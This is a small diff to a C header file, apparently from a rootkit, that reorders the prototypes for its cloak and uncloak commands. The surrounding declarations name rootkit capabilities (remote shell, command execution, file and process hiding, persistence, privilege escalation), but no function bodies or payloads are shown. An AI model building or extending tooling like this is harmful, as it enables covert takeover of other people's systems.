@@ -140,6 +140,8 @@ int cmd_info(struct rk_session *s, const char *arg);
 int cmd_shell(struct rk_session *s, const char *arg);
 int cmd_exec(struct rk_session *s, const char *arg);
 int cmd_download(struct rk_session *s, const char *arg);
+int cmd_cloak(struct rk_session *s, const char *arg);
+int cmd_uncloak(struct rk_session *s, const char *arg);
 int cmd_hide_file(struct rk_session *s, const char *arg);
 int cmd_unhide_file(struct rk_session *s, const char *arg);
 int cmd_hide_pid(struct rk_session *s, const char *arg);
@@ -152,8 +154,6 @@ int cmd_list(struct rk_session *s, const char *arg);
 int cmd_persist(struct rk_session *s, const char *arg);
 int cmd_unpersist(struct rk_session *s, const char *arg);
 int cmd_escalate(struct rk_session *s, const char *arg);
-int cmd_cloak(struct rk_session *s, const char *arg);
-int cmd_uncloak(struct rk_session *s, const char *arg);
 
 /* ---- execution/shell.c ---- */
 
